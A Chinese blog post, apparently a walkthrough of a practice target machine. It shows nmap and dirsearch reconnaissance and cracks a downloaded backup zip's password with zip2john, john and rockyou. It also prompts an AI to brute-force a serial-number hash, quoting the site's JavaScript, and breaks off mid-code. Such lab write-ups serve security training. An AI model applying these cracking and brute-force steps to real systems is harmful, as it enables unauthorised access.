<!DOCTYPE html>
<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
    
    <link rel="icon" href="https://raw.githubusercontent.com/pingsag3/blog_img/main/images/Nazha.jpg"><script>
        let theme = localStorage.getItem("meek_theme") || "light";
        document.documentElement.setAttribute("data-color-mode", theme);
    </script>
<meta name="description" content="
### 1. 基本信息

```
靶机链接：
https://maze-sec.com/library
```

```shell
难度：⭐️⭐️
知识点：信息收集，`hash`爆破，`pm2`提权，`npm`提权
```

### 2. 信息收集

### Nmap

```shell
└─# arp-scan -l | grep PCS
192.168.31.127  08:00:27:42:f3:c5       PCS Systemtechnik GmbH
└─# IP=192.168.31.127
└─# nmap -sV -sC -A $IP -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-07 08:32 CST
Nmap scan report for lingdong (192.168.31.127)
Host is up (0.0018s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 10.0 (protocol 2.0)
8080/tcp open  http    Node.js Express framework
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: \xE5\xA4\xA7\xE5\x82\xBB\xE5\xAD\x90\xE5\xBA\x8F\xE5\x88\x97\xE5\x8F\xB7\xE9\xAA\x8C\xE8\xAF\x81\xE7\xB3\xBB\xE7\xBB\x9F
| http-robots.txt: 1 disallowed entry
|_zip2john 2026bak.zip > ziphash
MAC Address: 08:00:27:42:F3:C5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

开放了`22、8080`端口,先看看`web`有啥东西

### 3.目录扫描

```shell
└─# dirsearch -u http://$IP:8080  -x 403 -e txt,php,html
[08:33:55] 301 -  153B  - /css  ->  /css/
[08:33:58] 301 -  152B  - /js  ->  /js/
[08:34:03] 200 -  122B  - /robots.txt
```

有`robots.txt`,先习惯性看看内容

```shell
#http://192.168.31.127:8080/robots.txt
User-agent: QQGroupbot
Disallow: zip2john 2026bak.zip > ziphash
john --wordlist=/usr/share/wordlists/rockyou.txt ziphash
```

把`2026bak.zip`取下来

```shell
└─# wget http://192.168.31.127:8080/2026bak.zip
--2025-06-07 08:41:05--  http://192.168.31.127:8080/2026bak.zip
正在连接 192.168.31.127:8080... 已连接。">
<meta property="og:title" content="群友靶机：凌动bugHash 测试记录">
<meta property="og:description" content="
### 1. 基本信息

```
靶机链接：
https://maze-sec.com/library
```

```shell
难度：⭐️⭐️
知识点：信息收集，`hash`爆破，`pm2`提权，`npm`提权
```

### 2. 信息收集

### Nmap

```shell
└─# arp-scan -l | grep PCS
192.168.31.127  08:00:27:42:f3:c5       PCS Systemtechnik GmbH
└─# IP=192.168.31.127
└─# nmap -sV -sC -A $IP -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-07 08:32 CST
Nmap scan report for lingdong (192.168.31.127)
Host is up (0.0018s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 10.0 (protocol 2.0)
8080/tcp open  http    Node.js Express framework
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: \xE5\xA4\xA7\xE5\x82\xBB\xE5\xAD\x90\xE5\xBA\x8F\xE5\x88\x97\xE5\x8F\xB7\xE9\xAA\x8C\xE8\xAF\x81\xE7\xB3\xBB\xE7\xBB\x9F
| http-robots.txt: 1 disallowed entry
|_zip2john 2026bak.zip > ziphash
MAC Address: 08:00:27:42:F3:C5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

开放了`22、8080`端口,先看看`web`有啥东西

### 3.目录扫描

```shell
└─# dirsearch -u http://$IP:8080  -x 403 -e txt,php,html
[08:33:55] 301 -  153B  - /css  ->  /css/
[08:33:58] 301 -  152B  - /js  ->  /js/
[08:34:03] 200 -  122B  - /robots.txt
```

有`robots.txt`,先习惯性看看内容

```shell
#http://192.168.31.127:8080/robots.txt
User-agent: QQGroupbot
Disallow: zip2john 2026bak.zip > ziphash
john --wordlist=/usr/share/wordlists/rockyou.txt ziphash
```

把`2026bak.zip`取下来

```shell
└─# wget http://192.168.31.127:8080/2026bak.zip
--2025-06-07 08:41:05--  http://192.168.31.127:8080/2026bak.zip
正在连接 192.168.31.127:8080... 已连接。">
<meta property="og:type" content="article">
<meta property="og:url" content="https://pingsag3.github.io/post/qun-you-ba-ji-%EF%BC%9A-ling-dong-bugHash%20-ce-shi-ji-lu.html">
<meta property="og:image" content="https://raw.githubusercontent.com/pingsag3/blog_img/main/images/Nazha.jpg">
<title>群友靶机：凌动bugHash 测试记录</title>
<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />


</head>
<style>
body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
#footer {margin-top:64px; text-align: center;font-size: small;}

</style>

<style>
.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
.title-right{display:flex;margin:auto 0 0 auto;}
.title-right .circle{padding: 14px 16px;margin-right:8px;}
#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
#postBody hr{height:2px;}
#cmButton{height:48px;margin-top:48px;}
#comments{margin-top:64px;}
.g-emoji{font-size:24px;}
@media (max-width: 600px) {
    body {padding: 8px;}
    .postTitle{font-size:24px;}
}
.copy-feedback {
    display: none;
    position: absolute;
    top: 10px;
    right: 50px;
    color: var(--color-fg-on-emphasis);
    background-color: var(--color-fg-muted);
    border-radius: 3px;
    padding: 5px 8px;
    font-size: 12px;
}
</style>




<body>
    <div id="header">
<h1 class="postTitle">群友靶机：凌动bugHash 测试记录</h1>
<div class="title-right">
    <a href="https://pingsag3.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
        <svg class="octicon" width="16" height="16">
            <path id="pathHome" fill-rule="evenodd"></path>
        </svg>
    </a>
    
    <a href="https://github.com/pingsag3/pingsag3.github.io/issues/5" target="_blank" class="btn btn-invisible circle" title="Issue">
        <svg class="octicon" width="16" height="16">
            <path id="pathIssue" fill-rule="evenodd"></path>
        </svg>
    </a>
    

    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
        <svg class="octicon" width="16" height="16" >
            <path id="themeSwitch" fill-rule="evenodd"></path>
        </svg>
    </a>

</div>
</div>
    <div id="content">
<div class="markdown-body" id="postBody"><h3>1. 基本信息</h3>
<pre class="notranslate"><code class="notranslate">靶机链接：
https://maze-sec.com/library
</code></pre>
<div class="highlight highlight-source-shell"><pre class="notranslate">难度：⭐️⭐️
知识点：信息收集，<span class="pl-s"><span class="pl-pds">`</span>hash<span class="pl-pds">`</span></span>爆破，<span class="pl-s"><span class="pl-pds">`</span>pm2<span class="pl-pds">`</span></span>提权，<span class="pl-s"><span class="pl-pds">`</span>npm<span class="pl-pds">`</span></span>提权</pre></div>
<h3>2. 信息收集</h3>
<h3>Nmap</h3>
<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> arp-scan -l | grep PCS</span>
192.168.31.127  08:00:27:42:f3:c5       PCS Systemtechnik GmbH
└─<span class="pl-c"><span class="pl-c">#</span> IP=192.168.31.127</span>
└─<span class="pl-c"><span class="pl-c">#</span> nmap -sV -sC -A $IP -Pn</span>
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-07 08:32 CST
Nmap scan report <span class="pl-k">for</span> lingdong (192.168.31.127)
Host is up (0.0018s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 10.0 (protocol 2.0)
8080/tcp open  http    Node.js Express framework
<span class="pl-k">|</span>_http-open-proxy: Proxy might be redirecting requests
<span class="pl-k">|</span>_http-title: <span class="pl-cce">\x</span>E5<span class="pl-cce">\x</span>A4<span class="pl-cce">\x</span>A7<span class="pl-cce">\x</span>E5<span class="pl-cce">\x</span>82<span class="pl-cce">\x</span>BB<span class="pl-cce">\x</span>E5<span class="pl-cce">\x</span>AD<span class="pl-cce">\x</span>90<span class="pl-cce">\x</span>E5<span class="pl-cce">\x</span>BA<span class="pl-cce">\x</span>8F<span class="pl-cce">\x</span>E5<span class="pl-cce">\x</span>88<span class="pl-cce">\x</span>97<span class="pl-cce">\x</span>E5<span class="pl-cce">\x</span>8F<span class="pl-cce">\x</span>B7<span class="pl-cce">\x</span>E9<span class="pl-cce">\x</span>AA<span class="pl-cce">\x</span>8C<span class="pl-cce">\x</span>E8<span class="pl-cce">\x</span>AF<span class="pl-cce">\x</span>81<span class="pl-cce">\x</span>E7<span class="pl-cce">\x</span>B3<span class="pl-cce">\x</span>BB<span class="pl-cce">\x</span>E7<span class="pl-cce">\x</span>BB<span class="pl-cce">\x</span>9F
<span class="pl-k">|</span> http-robots.txt: 1 disallowed entry
<span class="pl-k">|</span>_zip2john 2026bak.zip <span class="pl-k">&gt;</span> ziphash
MAC Address: 08:00:27:42:F3:C5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</pre></div>
<p>开放了<code class="notranslate">22、8080</code>端口,先看看<code class="notranslate">web</code>有啥东西</p>
<h3>3.目录扫描</h3>
<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> dirsearch -u http://$IP:8080  -x 403 -e txt,php,html</span>
[08:33:55] 301 -  153B  - /css  -<span class="pl-k">&gt;</span>  /css/
[08:33:58] 301 -  152B  - /js  -<span class="pl-k">&gt;</span>  /js/
[08:34:03] 200 -  122B  - /robots.txt</pre></div>
<p>有<code class="notranslate">robots.txt</code>,先习惯性看看内容</p>
<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>http://192.168.31.127:8080/robots.txt</span>
User-agent: QQGroupbot
Disallow: zip2john 2026bak.zip <span class="pl-k">&gt;</span> ziphash
john --wordlist=/usr/share/wordlists/rockyou.txt ziphash</pre></div>
<p>把<code class="notranslate">2026bak.zip</code>取下来</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> wget http://192.168.31.127:8080/2026bak.zip</span>
--2025-06-07 08:41:05--  http://192.168.31.127:8080/2026bak.zip
正在连接 192.168.31.127:8080... 已连接。
已发出 HTTP 请求，正在等待回应... 200 OK
长度：676250 (660K) [application/zip]
正在保存至: “2026bak.zip”

2026bak.zip                   100%[<span class="pl-k">=================================================&gt;</span>] 660.40K  --.-KB/s  用时 0.1s

2025-06-07 08:41:06 (5.04 MB/s) - 已保存 “2026bak.zip” [676250/676250])
┌──(root㉿LAPTOP-FAMILY)-[/tmp]
└─<span class="pl-c"><span class="pl-c">#</span> zip2john 2026bak.zip &gt; ziphash</span>
└─<span class="pl-c"><span class="pl-c">#</span> john --wordlist=/usr/share/wordlists/rockyou.txt ziphash</span>
Using default input encoding: UTF-8
Loaded 1 password <span class="pl-c1">hash</span> (PKZIP [32/64])
Will run 24 OpenMP threads
Press <span class="pl-s"><span class="pl-pds">'</span>q<span class="pl-pds">'</span></span> or Ctrl-C to abort, almost any other key <span class="pl-k">for</span> status
123456789        (2026bak.zip)
1g 0:00:00:00 DONE (2025-06-07 08:42) 25.00g/s 1228Kp/s 1228Kc/s 1228KC/s 123456..trudy
Use the <span class="pl-s"><span class="pl-pds">"</span>--show<span class="pl-pds">"</span></span> option to display all of the cracked passwords reliably
Session completed.</pre></div>
<p>根据提示爆破压缩包密码为<code class="notranslate">123456789</code>，解压后是网页的源码</p>
<h3>4.获得<code class="notranslate">welcome</code>权限</h3>
<p>没读取源码的备份也不影响，直接访问页面是一个<code class="notranslate">序列号验证</code>页面，看源码有加密逻辑，把已知信息丢给<code class="notranslate">AI</code>让写个脚本爆破正确序列号，丢给ai的内容</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">已知网页源码如下，编写python脚本，爆破正确序列号:
<span class="pl-c"><span class="pl-c">#</span>index.js</span>
document.addEventListener(<span class="pl-s"><span class="pl-pds">'</span>DOMContentLoaded<span class="pl-pds">'</span></span>, <span class="pl-k">function</span> <span class="pl-en">()</span> {
    const snInput = document.getElementById(<span class="pl-s"><span class="pl-pds">'</span>sn-input<span class="pl-pds">'</span></span>)<span class="pl-k">;</span>
    const verifyBtn = document.getElementById(<span class="pl-s"><span class="pl-pds">'</span>verify-btn<span class="pl-pds">'</span></span>)<span class="pl-k">;</span>
    const responseText = document.getElementById(<span class="pl-s"><span class="pl-pds">'</span>response-text<span class="pl-pds">'</span></span>)<span class="pl-k">;</span>
    const statusIcon = document.getElementById(<span class="pl-s"><span class="pl-pds">'</span>status-icon<span class="pl-pds">'</span></span>)<span class="pl-k">;</span>
    <span class="pl-k">function</span> <span class="pl-en">cleanInput(value)</span> {
        <span class="pl-k">return</span> value.replace(/[^a-zA-Z0-9]/g, <span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span>).toUpperCase()<span class="pl-k">;</span>
    }
    <span class="pl-k">function</span> <span class="pl-en">formatSerialNumber(value)</span> {
        <span class="pl-c1">let</span> cleanValue = cleanInput(value)<span class="pl-k">;</span>
        <span class="pl-c1">let</span> formatted = <span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span><span class="pl-k">;</span>
        <span class="pl-k">for</span> (let i = 0<span class="pl-k">;</span> i <span class="pl-k">&lt;</span> cleanValue.length<span class="pl-k">;</span> i++) {
            <span class="pl-k">if</span> (i <span class="pl-k">&gt;</span> 0 <span class="pl-k">&amp;&amp;</span> i % 5 === 0) {
                formatted += <span class="pl-s"><span class="pl-pds">'</span>-<span class="pl-pds">'</span></span><span class="pl-k">;</span>
            }
            formatted += cleanValue[i]<span class="pl-k">;</span>
        }
        <span class="pl-k">return</span> formatted<span class="pl-k">;</span>
    }
    snInput.addEventListener(<span class="pl-s"><span class="pl-pds">'</span>input<span class="pl-pds">'</span></span>, <span class="pl-k">function</span> <span class="pl-en">()</span> {
        const startPos = snInput.selectionStart<span class="pl-k">;</span>
        const formattedValue = formatSerialNumber(snInput.value)<span class="pl-k">;</span>
        snInput.value = formattedValue<span class="pl-k">;</span>
        <span class="pl-c1">let</span> newPos = startPos<span class="pl-k">;</span>
        <span class="pl-k">if</span> (startPos === 6 <span class="pl-k">||</span> startPos === 12 <span class="pl-k">||</span> startPos === 18 <span class="pl-k">||</span> startPos === 24) {
            newPos = startPos + 1<span class="pl-k">;</span>
        }
        snInput.setSelectionRange(newPos, newPos)<span class="pl-k">;</span>
    })<span class="pl-k">;</span>
    snInput.addEventListener(<span class="pl-s"><span class="pl-pds">'</span>keypress<span class="pl-pds">'</span></span>, <span class="pl-k">function</span> <span class="pl-en">(e)</span> {
        <span class="pl-k">if</span> (e.key === <span class="pl-s"><span class="pl-pds">'</span>Enter<span class="pl-pds">'</span></span>) {
            <span class="pl-en">verifySerialNumber</span>();
        }
    })<span class="pl-k">;</span>

    verifyBtn.addEventListener(<span class="pl-s"><span class="pl-pds">'</span>click<span class="pl-pds">'</span></span>, verifySerialNumber)<span class="pl-k">;</span>
    <span class="pl-k">function</span> <span class="pl-en">verifySerialNumber()</span> {
        const serialNumber = cleanInput(snInput.value)<span class="pl-k">;</span>
        statusIcon.className = <span class="pl-s"><span class="pl-pds">'</span>status-icon pending<span class="pl-pds">'</span></span><span class="pl-k">;</span>
        statusIcon.innerHTML = <span class="pl-s"><span class="pl-pds">'</span>&lt;i class="fas fa-circle-notch fa-spin"&gt;&lt;/i&gt;<span class="pl-pds">'</span></span><span class="pl-k">;</span>
        responseText.textContent = <span class="pl-s"><span class="pl-pds">"</span>验证中，请稍候...<span class="pl-pds">"</span></span><span class="pl-k">;</span>
        <span class="pl-k">if</span> (serialNumber.length <span class="pl-k">!</span>== 25) {
            statusIcon.className = <span class="pl-s"><span class="pl-pds">'</span>status-icon error<span class="pl-pds">'</span></span><span class="pl-k">;</span>
            statusIcon.innerHTML = <span class="pl-s"><span class="pl-pds">'</span>&lt;i class="fas fa-exclamation-triangle"&gt;&lt;/i&gt;<span class="pl-pds">'</span></span><span class="pl-k">;</span>
            responseText.textContent = <span class="pl-s"><span class="pl-pds">'</span>错误: 序列号长度不正确 (需要25个字符)<span class="pl-pds">'</span></span><span class="pl-k">;</span>
            <span class="pl-k">return</span><span class="pl-k">;</span>
        }
        <span class="pl-c1">let</span> hashSN = CreatehashSN(snInput.value)<span class="pl-k">;</span>
        // console.log(<span class="pl-s"><span class="pl-pds">"</span>hashSN:<span class="pl-pds">"</span></span>, hashSN)<span class="pl-k">;</span>

        <span class="pl-en">setTimeout(function</span> () {
            fetch(<span class="pl-s"><span class="pl-pds">'</span>/checkSN<span class="pl-pds">'</span></span>, {
                method: <span class="pl-s"><span class="pl-pds">'</span>POST<span class="pl-pds">'</span></span>,
                headers: {
                    <span class="pl-s"><span class="pl-pds">'</span>Content-Type<span class="pl-pds">'</span></span>: <span class="pl-s"><span class="pl-pds">'</span>application/json<span class="pl-pds">'</span></span>
                },
                body: JSON.stringify({ sn: hashSN })
            })
                .then(response =<span class="pl-k">&gt;</span> <span class="pl-en">response.json</span>())
                .then(data =<span class="pl-k">&gt;</span> {
                    console.log(<span class="pl-s"><span class="pl-pds">"</span>checkSN response:<span class="pl-pds">"</span></span>, data)<span class="pl-k">;</span>
                    <span class="pl-k">if</span> (data.code === 200) {
                        statusIcon.className = <span class="pl-s"><span class="pl-pds">'</span>status-icon success<span class="pl-pds">'</span></span><span class="pl-k">;</span>
                        statusIcon.innerHTML = <span class="pl-s"><span class="pl-pds">'</span>&lt;i class="fas fa-check-circle"&gt;&lt;/i&gt;<span class="pl-pds">'</span></span><span class="pl-k">;</span>
                        responseText.innerHTML = <span class="pl-s"><span class="pl-pds">`</span>序列号 <span class="pl-k">&lt;</span>strong<span class="pl-k">&gt;</span><span class="pl-smi">${snInput.value}</span><span class="pl-k">&lt;</span>/strong<span class="pl-k">&gt;</span> <span class="pl-k">&lt;</span>br<span class="pl-k">&gt;</span>验证成功！<span class="pl-k">&lt;</span>br<span class="pl-k">&gt;</span> <span class="pl-smi">${data.data}</span><span class="pl-pds">`</span></span><span class="pl-k">;</span>
                    }
                    <span class="pl-k">else</span> {
                        statusIcon.className = <span class="pl-s"><span class="pl-pds">'</span>status-icon error<span class="pl-pds">'</span></span><span class="pl-k">;</span>
                        statusIcon.innerHTML = <span class="pl-s"><span class="pl-pds">'</span>&lt;i class="fas fa-times-circle"&gt;&lt;/i&gt;<span class="pl-pds">'</span></span><span class="pl-k">;</span>
                        responseText.innerHTML = <span class="pl-s"><span class="pl-pds">`</span>序列号 <span class="pl-k">&lt;</span>strong<span class="pl-k">&gt;</span><span class="pl-smi">${snInput.value}</span><span class="pl-k">&lt;</span>/strong<span class="pl-k">&gt;</span> 验证失败！<span class="pl-k">&lt;</span>br<span class="pl-k">&gt;</span>状态: 无效或已被使用<span class="pl-pds">`</span></span><span class="pl-k">;</span>
                    }
                })<span class="pl-k">;</span>
        }, 300)<span class="pl-k">;</span>
    }
})<span class="pl-k">;</span>

// 随机数生成函数（使用Math.seedrandom）
<span class="pl-k">function</span> <span class="pl-en">R(seed,</span> min = 100, max = 200) {
    // const rng = new Math.seedrandom(seed)<span class="pl-k">;</span>
    // // <span class="pl-k">return</span> <span class="pl-en">Math.floor(rng</span>() <span class="pl-k">*</span> (max - min + 1)) + min;
    // <span class="pl-k">return</span> Math.floor<span class="pl-s"><span class="pl-pds">((</span>max <span class="pl-k">-</span> min <span class="pl-k">+</span> <span class="pl-c1">1</span><span class="pl-pds">))</span></span> + min<span class="pl-k">;</span>
    <span class="pl-k">return</span> seed + min + max<span class="pl-k">;</span>
}
<span class="pl-k">function</span> <span class="pl-en">CreatehashSN(SN)</span> {
    // if(SN.length<span class="pl-k">!</span>== 29)
    // {
    //     <span class="pl-k">return</span> <span class="pl-s"><span class="pl-pds">"</span>序列号长度不正确 (需要25个字符)<span class="pl-pds">"</span></span><span class="pl-k">;</span>
    // }
    console.log(<span class="pl-s"><span class="pl-pds">"</span>SN<span class="pl-pds">"</span></span>, SN)<span class="pl-k">;</span>
    const VI = <span class="pl-s"><span class="pl-pds">"</span>Jkdsfojweflk0024564555*<span class="pl-pds">"</span></span><span class="pl-k">;</span>
    const KEY = <span class="pl-s"><span class="pl-pds">"</span>6K+35LiN6KaB5bCd6K+V5pq05Yqb56C06Kej77yM5LuU57uG55yL55yL5Yqg5a+G5rqQ5Luj56CB44CC<span class="pl-pds">"</span></span><span class="pl-k">;</span>

    <span class="pl-c1">let</span> a = []<span class="pl-k">;</span>
    <span class="pl-c1">let</span> b = []<span class="pl-k">;</span>
    <span class="pl-c1">let</span> e = []<span class="pl-k">;</span>
    <span class="pl-c1">let</span> f = []<span class="pl-k">;</span>
    <span class="pl-c1">let</span> z = []<span class="pl-k">;</span>

    // 处理SN字符串
    <span class="pl-k">for</span> (let i = 0<span class="pl-k">;</span> i <span class="pl-k">&lt;</span> SN.length<span class="pl-k">;</span> i++) {
        const charCode = SN.charCodeAt(i)<span class="pl-k">;</span>

        <span class="pl-k">if</span> (i <span class="pl-k">&gt;</span>= 0 <span class="pl-k">&amp;&amp;</span> i <span class="pl-k">&lt;</span>= 4) {
            a.push(R(charCode))<span class="pl-k">;</span>
            b.push(R(charCode))<span class="pl-k">;</span>
            e.push(R(charCode))<span class="pl-k">;</span>
            f.push(R(charCode))<span class="pl-k">;</span>
            z.push(R(charCode))<span class="pl-k">;</span>
        }
        <span class="pl-k">if</span> (i <span class="pl-k">&gt;</span>= 5 <span class="pl-k">&amp;&amp;</span> i <span class="pl-k">&lt;</span>= 9) {
            b.push(R(charCode))<span class="pl-k">;</span>
            e.push(R(charCode))<span class="pl-k">;</span>
            f.push(R(charCode))<span class="pl-k">;</span>
            z.push(R(charCode))<span class="pl-k">;</span>
        }
        <span class="pl-k">if</span> (i <span class="pl-k">&gt;</span>= 10 <span class="pl-k">&amp;&amp;</span> i <span class="pl-k">&lt;</span>= 14) {
            e.push(R(charCode))<span class="pl-k">;</span>
            f.push(R(charCode))<span class="pl-k">;</span>
            z.push(R(charCode))<span class="pl-k">;</span>
        }
        <span class="pl-k">if</span> (i <span class="pl-k">&gt;</span>= 15 <span class="pl-k">&amp;&amp;</span> i <span class="pl-k">&lt;</span>= 19) {
            f.push(R(charCode))<span class="pl-k">;</span>
            z.push(R(charCode))<span class="pl-k">;</span>
        }
        <span class="pl-k">if</span> (i <span class="pl-k">&gt;</span>= 20 <span class="pl-k">&amp;&amp;</span> i <span class="pl-k">&lt;</span>= 24) {
            z.push(R(charCode))<span class="pl-k">;</span>
        }
    }
    // console.log(<span class="pl-s"><span class="pl-pds">"</span>a<span class="pl-pds">"</span></span>, a)<span class="pl-k">;</span>
    // console.log(<span class="pl-s"><span class="pl-pds">"</span>b<span class="pl-pds">"</span></span>, b)<span class="pl-k">;</span>
    // console.log(<span class="pl-s"><span class="pl-pds">"</span>e<span class="pl-pds">"</span></span>, e)<span class="pl-k">;</span>
    // console.log(<span class="pl-s"><span class="pl-pds">"</span>f<span class="pl-pds">"</span></span>, f)<span class="pl-k">;</span>
    // console.log(<span class="pl-s"><span class="pl-pds">"</span>z<span class="pl-pds">"</span></span>, z)<span class="pl-k">;</span>
    // e = Math.max(f, g)<span class="pl-k">;</span>
    <span class="pl-k">if</span> (a[0] <span class="pl-k">&gt;</span> a[2] <span class="pl-k">||</span> a[1] <span class="pl-k">&gt;</span> a[3]) {
        a[0] = Math.max(a[0], a[1], a[2], a[3], a[4])<span class="pl-k">;</span>
    } <span class="pl-k">else</span> {
        a[0] = Math.min(a[0], a[1], a[2], a[3], a[4])<span class="pl-k">;</span>
    }
    <span class="pl-k">if</span> (b[4] <span class="pl-k">&gt;</span> b[6]) {
        b[0] = Math.max(b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7])<span class="pl-k">;</span>
    } <span class="pl-k">else</span> {
        b[0] = Math.min(b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7])<span class="pl-k">;</span>
    }
    <span class="pl-k">if</span> (e[8] <span class="pl-k">&gt;</span> e[10] <span class="pl-k">||</span> e[9] <span class="pl-k">&gt;</span> e[11]) {
        e[0] = Math.max(e[0], e[1], e[2], e[3], e[4], e[5], e[6], e[7], e[8], e[9], e[10], e[11])<span class="pl-k">;</span>
    } <span class="pl-k">else</span> {
        e[0] = Math.min(e[0], e[1], e[2], e[3], e[4], e[5], e[6], e[7], e[8], e[9], e[10], e[11])<span class="pl-k">;</span>
    }
    <span class="pl-k">if</span> (f[0] <span class="pl-k">&gt;</span> f[10]) {
        f[0] = Math.max(f[0], f[1], f[2], f[3], f[4], f[5], f[6], f[7], f[8], f[9], f[10], f[11], f[12], f[13], f[14], f[15], f[16], f[17], f[18], f[19])<span class="pl-k">;</span>
    } <span class="pl-k">else</span> {
        f[0] = Math.min(f[0], f[1], f[2], f[3], f[4], f[5], f[6], f[7], f[8], f[9], f[10], f[11], f[12], f[13], f[14], f[15], f[16], f[17], f[18], f[19])<span class="pl-k">;</span>
    }
    <span class="pl-k">if</span> (z[15] <span class="pl-k">&gt;</span> z[17] <span class="pl-k">||</span> z[18] <span class="pl-k">&gt;</span> z[24]) {
        z[0] = Math.max(z[0], z[1], z[2], z[3], z[4], z[5], z[6], z[7], z[8], z[9], z[10], z[11], z[12], z[13], z[14], z[15], z[16], z[17], z[18], z[19], z[20], z[21], z[22], z[23], z[24])<span class="pl-k">;</span>
    } <span class="pl-k">else</span> {
        z[0] = Math.min(z[0], z[1], z[2], z[3], z[4], z[5], z[6], z[7], z[8], z[9], z[10], z[11], z[12], z[13], z[14], z[15], z[16], z[17], z[18], z[19], z[20], z[21], z[22], z[23], z[24])<span class="pl-k">;</span>
    }
    // console.log(<span class="pl-s"><span class="pl-pds">"</span>a[0]<span class="pl-pds">"</span></span>, a[0])<span class="pl-k">;</span>
    // console.log(<span class="pl-s"><span class="pl-pds">"</span>b[0]<span class="pl-pds">"</span></span>, b[0])<span class="pl-k">;</span>
    // console.log(<span class="pl-s"><span class="pl-pds">"</span>e[0]<span class="pl-pds">"</span></span>, e[0])<span class="pl-k">;</span>
    // console.log(<span class="pl-s"><span class="pl-pds">"</span>f[0]<span class="pl-pds">"</span></span>, f[0])<span class="pl-k">;</span>
    // console.log(<span class="pl-s"><span class="pl-pds">"</span>z[0]<span class="pl-pds">"</span></span>, z[0])<span class="pl-k">;</span>
    <span class="pl-c1">let</span> sum = 0<span class="pl-k">;</span>
    <span class="pl-k">for</span> (let i = 0<span class="pl-k">;</span> i <span class="pl-k">&lt;</span> a.length<span class="pl-k">;</span> i++) {
        sum += a[i]
    }
    // console.log(<span class="pl-s"><span class="pl-pds">"</span>sum<span class="pl-pds">"</span></span>, sum)<span class="pl-k">;</span>
    a[0] = (sum ^ a[0]) % 12<span class="pl-k">;</span>
    a[0] = KEY.charAt(a[0])<span class="pl-k">;</span>

    <span class="pl-k">for</span> (let i = 0<span class="pl-k">;</span> i <span class="pl-k">&lt;</span> b.length<span class="pl-k">;</span> i++) {
        sum += b[i]
    }
    // console.log(<span class="pl-s"><span class="pl-pds">"</span>sum<span class="pl-pds">"</span></span>, sum)<span class="pl-k">;</span>
    b[0] = (sum ^ b[0]) % 9<span class="pl-k">;</span>
    b[0] = KEY.charAt(b[0])<span class="pl-k">;</span>

    <span class="pl-k">for</span> (let i = 0<span class="pl-k">;</span> i <span class="pl-k">&lt;</span> e.length<span class="pl-k">;</span> i++) {
        sum += e[i]
    }
    // console.log(<span class="pl-s"><span class="pl-pds">"</span>sum<span class="pl-pds">"</span></span>, sum)<span class="pl-k">;</span>

    e[0] = (sum ^ e[0]) % 8<span class="pl-k">;</span>
    e[0] = KEY.charAt(e[0])<span class="pl-k">;</span>


    <span class="pl-k">for</span> (let i = 0<span class="pl-k">;</span> i <span class="pl-k">&lt;</span> f.length<span class="pl-k">;</span> i++) {
        sum += f[i]
    }
    // console.log(<span class="pl-s"><span class="pl-pds">"</span>sum<span class="pl-pds">"</span></span>, sum)<span class="pl-k">;</span>
    f[0] = (sum ^ f[0]) % 7<span class="pl-k">;</span>
    f[0] = KEY.charAt(f[0])<span class="pl-k">;</span>

    <span class="pl-k">for</span> (let i = 0<span class="pl-k">;</span> i <span class="pl-k">&lt;</span> z.length<span class="pl-k">;</span> i++) {
        sum += z[i]
    }
    // console.log(<span class="pl-s"><span class="pl-pds">"</span>sum<span class="pl-pds">"</span></span>, sum)<span class="pl-k">;</span>
    z[0] = (sum ^ z[0]) % 6<span class="pl-k">;</span>
    z[0] = VI.charAt(z[0])<span class="pl-k">;</span>

    // console.log(<span class="pl-s"><span class="pl-pds">"</span>a[0]<span class="pl-pds">"</span></span>, a[0])<span class="pl-k">;</span>
    // console.log(<span class="pl-s"><span class="pl-pds">"</span>b[0]<span class="pl-pds">"</span></span>, b[0])<span class="pl-k">;</span>
    // console.log(<span class="pl-s"><span class="pl-pds">"</span>e[0]<span class="pl-pds">"</span></span>, e[0])<span class="pl-k">;</span>
    // console.log(<span class="pl-s"><span class="pl-pds">"</span>f[0]<span class="pl-pds">"</span></span>, f[0])<span class="pl-k">;</span>
    // console.log(<span class="pl-s"><span class="pl-pds">"</span>z[0]<span class="pl-pds">"</span></span>, z[0])<span class="pl-k">;</span>
    <span class="pl-c1">let</span> hashSN = md5(a[0] + b[0] + e[0] + f[0] + z[0])<span class="pl-k">;</span>
